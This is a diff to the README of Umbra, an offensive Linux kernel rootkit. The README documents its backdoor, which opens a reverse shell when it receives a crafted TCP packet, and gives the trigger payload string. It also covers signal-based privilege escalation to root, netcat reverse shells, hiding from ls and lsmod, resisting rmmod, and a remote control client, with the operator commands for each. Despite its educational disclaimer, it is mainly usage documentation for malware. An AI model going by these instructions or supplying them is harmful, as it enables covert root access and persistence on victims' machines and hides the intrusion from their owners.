@@ -9,24 +9,38 @@ Umbra (/ˈʌmbrə/) is an experimental LKM rootkit for kernels 4.x and 5.x (up t
 
 The rootkit is still under development, although the features listed below are already fully operational.
 
-![Backdoor in action](https://github.com/h3xduck/Umbra/blob/master/images/umbrabackdoor.gif)
+![Backdoor in action](https://github.com/h3xduck/Umbra/blob/master/images/umbra.gif)
 
 Note: This rootkit has been developed and tested using kernel 5.4.0 and Ubuntu 18.04.
 
 ## Features
-* **NEW**: Backdoor which spawns reverse shell to remote IP after receiving a malicious TCP packet.
+* :star2: Backdoor which spawns reverse shell to remote IP after receiving a malicious TCP packet.
 * Privilege escalation by sending signal 50.
 * Spawn netcat reverse shell on module load.
 * Spawn netcat reverse shell to a remote host by sending signal 51.
+* **NEW**: Added the *Umbra Injector* to control the rootkit remotely:
+  * Remote reverse shell.
+  * Hide/unhide rootkit remotely.
+    
+<img src="images/umbrainjector.png" width = 800/>
+* **NEW**: Umbra hides all its files and directories from user commands such as *ls*.
+* **NEW**: Umbra can hide/unhide itself remotely and locally via signals.
 
 More functionalities will come in later updates.
 
 ## Disclaimer
 This rookit is **purely for educational purposes**. I am not responsible for any damage resulting from its unintended use.
 
-Also bear in mind that Umbra does not incorporate any rootkit hiding or protection mechanisms yet.
+Also bear in mind that Umbra only incorporates light hiding and protection mechanisms. It is **not** intended to be used on a real scenario.
 
 **IMPORTANT:** If you are going to test this rootkit in your own machine, I *strongly recommend* to use a VM. 
+
+## Table of Contents
+1. [Build and Install](#build-and-install)
+2. [Unloading Umbra](#unloading-umbra)
+3. [Local Control](#basic-usage-local-control)
+4. [Remote Control](#umbra-injector-remote-control)
+5. [References](#references)
 
 ## Build and install
 Remember that you should have a 4.x or 5.x kernel available.
@@ -55,7 +69,7 @@ sudo insmod ./umbra.ko
 sudo rmmod umbra
 ```
 
-## Usage
+## Basic Usage: Local control
 ### Change current user privileges to root
 * Send signal 50 to any PID.
 ```
@@ -77,21 +91,49 @@ kill -51 1
 
 Note: Umbra also tries to start the reverse shell on load.
 
-### **NEW**: Spawn reverse shell via backdoor
+### Spawn reverse shell via backdoor
 Any host can get a reverse shell by sending a specially-crafted packet to a machine infected with Umbra. The backdoor will try to open the shell on IP:5888, where IP is the IP address of the attacking machine.
 
-You can look at the code to know how to build your own packet, but I also provide a client which will do the job for you. You can download the client from [latest releases](https://github.com/h3xduck/Umbra/releases/), or you can build your own using my library [RawTCP](https://github.com/h3xduck/RawTCP_Lib).
+The backdoor listens for packets with the following payload:
+`UMBRA_PAYLOAD_GET_REVERSE_SHELL`
+, but I also provide a client which will do the job for you. You can download the client from [latest releases](https://github.com/h3xduck/Umbra/releases/), or you can build your own using my library [RawTCP](https://github.com/h3xduck/RawTCP_Lib).
 
-The client is run as follows:
-
+### Hide the rootkit - Invisible mode
+This will prevent the rootkit from being shown by commands such as *lsmod*, or being removed via *rmmod*.
 ```
-./client <attacker_ip> <victim_ip>
+kill -52 1
 ```
-Where the attacker ip will be used by the backdoor to connect the reverse shell and the victim ip is the one of the machine infected with Umbra.
 
+### Unhide the rootkit
+This reverts the invisible mode if active.
+```
+./client -53 127.0.0.1
+```
 
+## Umbra Injector: Remote control
+### **NEW**: Get reverse shell
+The program can be run either before Umbra is installed (thus waiting until it is), or after Umbra is installed on the target system.
+```
+./client -S 127.0.0.1
+```
 
+### **NEW**: Hide the rootkit remotely - Invisible mode
+This will prevent the rootkit from being shown by commands such as *lsmod*, or being removed via *rmmod*.
+```
+./client -i 127.0.0.1
+```
 
+### **NEW**: Unhide the rootkit remotely
+This reverts the invisible mode if active.
+```
+./client -u 127.0.0.1
+```
+
+### Help
+You can see the full information on how to run the client by:
+```
+./client -h
+```
 
 
 
